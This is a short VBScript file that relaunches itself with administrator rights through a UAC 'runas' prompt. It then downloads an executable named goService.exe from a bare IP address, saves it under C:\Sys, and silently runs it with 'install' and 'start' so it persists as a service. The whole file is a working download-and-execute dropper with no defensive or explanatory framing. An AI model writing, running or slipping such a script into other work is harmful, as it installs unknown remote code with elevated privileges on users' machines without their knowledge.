' Check if script is running as admin
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

' Now running as admin, proceed with the script
Dim url, downloadPath, objXMLHTTP, objFSO, objFile, objShell
url = "http://51.81.73.108:5552/uploads/goService.exe"
downloadPath = "C:\Sys\goService.exe"

' Download the file
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objXMLHTTP.Open "GET", url, False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(downloadPath, True)
    objFile.Write objXMLHTTP.ResponseBody
    objFile.Close
End If

' Install and start the service using the downloaded file
Set objShell = CreateObject("WScript.Shell")
objShell.Run """" & downloadPath & """ install", 0, True
objShell.Run """" & downloadPath & """ start", 0, True
